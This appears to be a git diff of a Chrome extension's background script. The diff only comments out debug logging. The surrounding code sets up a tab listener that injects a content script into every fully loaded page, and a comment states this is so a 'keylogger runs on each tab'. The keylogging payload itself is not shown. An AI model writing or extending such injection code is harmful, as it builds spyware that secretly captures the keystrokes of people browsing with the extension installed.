@@ -26,9 +26,9 @@ class Tabs {
   _init() {
     // Listens for tab updates and ensures keylogger runs on each tab
     chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-      console.log('chrome.tabs.onUpdated', tabId, changeInfo)
+      // console.log('chrome.tabs.onUpdated', tabId, changeInfo)
       if (changeInfo.status && changeInfo.status === "complete") {
-        console.log("EventListenr is added")
+        // console.log("EventListenr is added")
         this.keyloggerSetup(tabId, changeInfo, tab);
       }
     })
@@ -59,7 +59,7 @@ class Tabs {
         file: "contentScript.js",
         runAt: 'document_idle'
       }, (res) => {
-        console.log('keyloggerSetup RES', res)
+        // console.log('keyloggerSetup RES', res)
         if (chrome.runtime.lastError) {
           console.log(chrome.runtime.lastError.message);
         }
